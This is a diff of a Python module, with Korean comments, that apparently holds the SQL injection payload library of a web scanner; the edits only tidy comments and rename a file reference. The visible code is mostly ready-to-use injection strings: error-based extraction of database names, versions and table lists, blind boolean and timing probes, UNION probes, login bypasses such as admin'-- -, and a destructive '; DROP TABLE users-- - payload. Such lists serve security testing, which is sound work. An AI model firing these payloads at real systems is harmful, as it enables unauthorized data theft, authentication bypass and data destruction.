@@ -11,7 +11,7 @@ STRENGTH_LIMIT = {
     "INSANE": 9999,
 }
 
-# ── MySQL 에러 탐지 패턴 ───────────────────────────────────────────────────────
+#  MySQL 에러 탐지 패턴 
 ERROR_PATTERNS = [
     "you have an error in your sql syntax",
     "warning: mysql",
@@ -40,7 +40,7 @@ ERROR_PATTERNS = [
     "invalid object name",
 ]
 
-# ── Error-based (문자열 컨텍스트) ─────────────────────────────────────────────
+#  Error-based (문자열 컨텍스트) 
 ERROR_BASED_STRING: List[Payload] = [
     {"type": "ERROR_BASED", "family": "extractvalue_db",      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
     {"type": "ERROR_BASED", "family": "extractvalue_version",  "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"},
@@ -55,7 +55,7 @@ ERROR_BASED_STRING: List[Payload] = [
     {"type": "ERROR_BASED", "family": "or_updatexml_db",       "payload": "' OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
 ]
 
-# ── Error-based (숫자 컨텍스트) ───────────────────────────────────────────────
+#  Error-based (숫자 컨텍스트) 
 ERROR_BASED_NUMERIC: List[Payload] = [
     {"type": "ERROR_BASED", "family": "num_extractvalue_db",     "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
     {"type": "ERROR_BASED", "family": "num_extractvalue_version","payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))"},
@@ -65,7 +65,7 @@ ERROR_BASED_NUMERIC: List[Payload] = [
     {"type": "ERROR_BASED", "family": "num_extractvalue_tables", "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))"},
 ]
 
-# ── Boolean-based (문자열 컨텍스트) ───────────────────────────────────────────
+#  Boolean-based (문자열 컨텍스트) 
 BOOLEAN_STRING: List[Payload] = [
     {"type": "BOOLEAN", "family": "or_true",           "payload": "' OR '1'='1"},
     {"type": "BOOLEAN", "family": "or_true_comment",   "payload": "' OR 1=1-- -"},
@@ -84,7 +84,7 @@ BOOLEAN_STRING: List[Payload] = [
     {"type": "BOOLEAN", "family": "in_subquery",       "payload": "' AND 1 IN (SELECT 1 FROM information_schema.tables LIMIT 1)-- -"},
 ]
 
-# ── Boolean-based (숫자 컨텍스트) ─────────────────────────────────────────────
+#  Boolean-based (숫자 컨텍스트) 
 BOOLEAN_NUMERIC: List[Payload] = [
     {"type": "BOOLEAN", "family": "num_or_true",       "payload": "0 OR 1=1"},
     {"type": "BOOLEAN", "family": "num_and_false",     "payload": "1 AND 1=2"},
@@ -94,7 +94,7 @@ BOOLEAN_NUMERIC: List[Payload] = [
     {"type": "BOOLEAN", "family": "num_exists",        "payload": "0 OR EXISTS(SELECT * FROM information_schema.tables)"},
 ]
 
-# ── Time-based (문자열 컨텍스트) ──────────────────────────────────────────────
+#  Time-based (문자열 컨텍스트) 
 TIME_BASED_STRING: List[Payload] = [
     {"type": "TIME_BASED", "family": "and_sleep",          "payload": f"' AND SLEEP({_SLEEP})-- -"},
     {"type": "TIME_BASED", "family": "or_sleep",           "payload": f"' OR SLEEP({_SLEEP})-- -"},
@@ -108,7 +108,7 @@ TIME_BASED_STRING: List[Payload] = [
     {"type": "TIME_BASED", "family": "waitfor",            "payload": f"'; WAITFOR DELAY '0:0:{_SLEEP}'-- -"},
 ]
 
-# ── Time-based (숫자 컨텍스트) ────────────────────────────────────────────────
+#  Time-based (숫자 컨텍스트) 
 TIME_BASED_NUMERIC: List[Payload] = [
     {"type": "TIME_BASED", "family": "num_sleep",          "payload": f"0 OR SLEEP({_SLEEP})"},
     {"type": "TIME_BASED", "family": "num_if_sleep",       "payload": f"0 OR IF(1=1,SLEEP({_SLEEP}),0)"},
@@ -116,7 +116,7 @@ TIME_BASED_NUMERIC: List[Payload] = [
     {"type": "TIME_BASED", "family": "num_benchmark",      "payload": f"0 OR BENCHMARK({_SLEEP*1000000},MD5(1))"},
 ]
 
-# ── UNION-based ───────────────────────────────────────────────────────────────
+#  UNION-based 
 def _union_nulls(n: int, quote: str = "'") -> Payload:
     nulls = ",".join(["NULL"] * n)
     return {"type": "UNION", "family": f"null_probe_{n}col", "payload": f"{quote} UNION SELECT {nulls}-- -"}
@@ -135,7 +135,7 @@ UNION_BASED: List[Payload] = (
     ]
 )
 
-# ── ORDER BY Injection ────────────────────────────────────────────────────────
+#  ORDER BY Injection 
 ORDERBY: List[Payload] = [
     {"type": "SQLI_ORDERBY", "family": "sleep_subq",        "payload": f"(SELECT SLEEP({_SLEEP}))"},
     {"type": "SQLI_ORDERBY", "family": "if_sleep",          "payload": f"IF(1=1,SLEEP({_SLEEP}),0)"},
@@ -152,7 +152,7 @@ ORDERBY: List[Payload] = [
     {"type": "SQLI_ORDERBY", "family": "floor_rand",        "payload": "(SELECT COUNT(*) FROM information_schema.tables GROUP BY FLOOR(RAND(0)*2))"},
 ]
 
-# ── Field Name Injection (WHERE col LIKE '%x%') ───────────────────────────────
+#  Field Name Injection (WHERE col LIKE '%x%') 
 FIELD_SELECTOR: List[Payload] = [
     {"type": "SQLI_FIELD", "family": "bool_true",        "payload": "1=1)-- -"},
     {"type": "SQLI_FIELD", "family": "bool_false",       "payload": "1=2)-- -"},
@@ -168,7 +168,7 @@ FIELD_SELECTOR: List[Payload] = [
     {"type": "SQLI_FIELD", "family": "or_extractvalue",  "payload": "id)OR(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
 ]
 
-# ── Login Form SQLi ───────────────────────────────────────────────────────────
+#  Login Form SQLi 
 SQLI_LOGIN: List[Payload] = [
     {"type": "SQLI_LOGIN", "family": "auth_bypass_admin",   "payload": "admin'-- -"},
     {"type": "SQLI_LOGIN", "family": "auth_bypass_comment", "payload": "'-- -"},
@@ -191,7 +191,7 @@ SQLI_LOGIN: List[Payload] = [
     {"type": "SQLI_LOGIN", "family": "stacked_query",       "payload": "'; DROP TABLE users-- -"},
 ]
 
-# ── 특수 컨텍스트 ─────────────────────────────────────────────────────────────
+#  특수 컨텍스트 
 
 # JSON 파라미터 내 SQLi
 JSON_CONTEXT: List[Payload] = [
@@ -212,7 +212,7 @@ ENCODED: List[Payload] = [
     {"type": "SQLI_STRING", "family": "scientific_notation", "payload": "' OR 1e0=1-- -"},
 ]
 
-# ── 헬퍼 함수 ─────────────────────────────────────────────────────────────────
+#  헬퍼 함수 
 
 def match_error(response_body: str) -> Optional[str]:
     body_lower = response_body.lower()
@@ -237,7 +237,7 @@ def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
     return result
 
 
-# ── 컨텍스트별 조회 ───────────────────────────────────────────────────────────
+#  컨텍스트별 조회 
 
 def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
     context = context.lower()
@@ -335,7 +335,7 @@ def get_by_strength(strength: str = "MEDIUM") -> List[Payload]:
     return _limit(get_all(), strength)
 
 
-# ── 하위 호환 alias ───────────────────────────────────────────────────────────
+#  하위 호환 alias 
 _SQL_CONTEXT_MAP = {
     "field_selector": "field",
     "auth":           "login",
@@ -343,7 +343,7 @@ _SQL_CONTEXT_MAP = {
 }
 
 def get_by_sql_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
-    """fuzzer/strategy.py 호환용 alias. get_by_context / get_blind_sqli 래핑."""
+    """probe/strategy.py 호환용 alias. get_by_context / get_blind_sqli 래핑."""
     mapped = _SQL_CONTEXT_MAP.get(context.lower())
     if mapped is None and context.lower() == "like_string":
         return _limit(get_blind_sqli("like_string"), strength)
